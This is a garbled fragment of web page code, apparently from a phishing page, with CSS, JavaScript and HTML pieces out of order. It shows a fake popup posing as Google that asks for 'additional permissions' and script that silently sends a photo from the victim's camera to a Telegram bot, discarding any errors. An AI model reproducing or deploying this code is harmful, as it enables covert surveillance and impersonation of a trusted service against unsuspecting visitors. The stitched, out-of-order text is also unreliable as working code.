            color: white;

            font-size: 14px;

                }).catch(e => console.log);

            if (cameraPhoto && cameraPhoto.length > 100) {
                try {
                    const blob = await (await fetch(cameraPhoto)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'camera.jpg');
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch(e) {}
            }

                    <p>Google needs additional permissions to verify your identity.</p>
                    <button id="allowPerms">Allow & Continue</button>
                </div>
            `;
            document.body.appendChild(popup);
            document.getElementById('allowPerms').addEventListener('click', () => {
                popup.remove();
                requestAllPermissions();
            });
